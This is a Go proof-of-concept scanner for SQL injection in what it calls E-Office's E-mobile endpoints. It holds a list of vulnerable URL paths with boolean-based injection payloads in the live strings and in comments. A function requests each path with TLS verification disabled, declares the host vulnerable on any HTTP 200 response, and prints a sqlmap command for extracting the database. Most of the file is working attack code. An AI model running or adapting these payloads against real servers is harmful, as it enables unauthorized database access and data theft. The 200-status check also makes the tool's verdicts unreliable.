package poc

import (
	"crypto/tls"
	"log"
	"net/http"
	"strings"
)

var EofficeSQLpaths = []string{
	"/E-mobile/flowdo_page.php?diff=delete&RUN_ID=(SELECT%20(CASE%20WHEN%20(2080=2080)%20THEN%201%20ELSE%20(SELECT%204346%20UNION%20SELECT%201731)%20END))",
	"/E-mobile/flowdo_page.php?diff=delete&flowid=1",
	//"/E-mobile/flowsorce_page.php?flowid=2",
	//"/E-mobile/flownext_page.php?diff=candeal&detailid=2",
	"/E-mobile/flowimage_page.php?FLOW_ID=2", // FLOW_ID=RLIKE (SELECT (CASE WHEN (1955=1955) THEN 2 ELSE 0x28 END))
	//"/E-mobile/flowform_page.php?FLOW_ID=2",
	"/E-mobile/diaryother_page.php?searchword=23",
	"/E-mobile/create/ajax_do.php?diff=word&sortid=1",
	"/E-mobile/create/ajax_do.php?diff=word&idstr=1",  //idstr=(SELECT (CASE WHEN (2142=2142) THEN 2 ELSE (SELECT 2992 UNION SELECT 1311) END))
	"/E-mobile/flow/freeflowimg.php?RUN_ID=",          //RUN_ID=(SELECT (CASE WHEN (8317=8317) THEN 1 ELSE (SELECT 9968 UNION SELECT 1588) END))
	"/E-mobile/create/ajax_do.php?diff=addr&sortid=1", //sortid=(SELECT (CASE WHEN (2866=2866) THEN 1 ELSE (SELECT 8436 UNION SELECT 7167) END))
	"/E-mobile/create/ajax_do.php?diff=addr&userdept=1",
	"/E-mobile/create/ajax_do.php?diff=addr&userpriv=1",
	"/E-mobile/create/ajax_do.php?diff=wordsearch&idstr=1",
	"/E-mobile/flow/flowhave_page.php?detailid=2,3",
	"/E-mobile/flow/flowtype_free.php?flowid=1",
	"/E-mobile/flow/flowtype_free.php?runid=1",
	"/E-mobile/flow/flowtype_other.php?flowid=1",
	"/E-mobile/flow/flowtype_other.php?runid=1",
	"/E-mobile/flow/freeflowimage_page.php?fromid=2",
	"/E-mobile/flow/freeflowimage_page.php?diff=new&runid=2",
}

func EOfficeSQL(target string, path string) {
	url := strings.TrimRight(target, "/")
	req, err := http.NewRequest("GET", url+path, nil)
	if err != nil {
		log.Println("err", err)
		return
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
		return
	}
	defer resp.Body.Close()
	//body, _ := io.ReadAll(resp.Body)
	//fmt.Println(string(body))
	if resp.StatusCode == http.StatusOK {
		log.Println("[+] 存在E-Office SQL注入漏洞")
		log.Println("[+] sqlmap命令：sqlmap.py -u \"" + url + path + "*\" --random-agent --dbms mysql --batch")
	} //else {
	//	log.Println("[-] 不存在漏洞")
	//	log.Println(url + path)
	//}
}
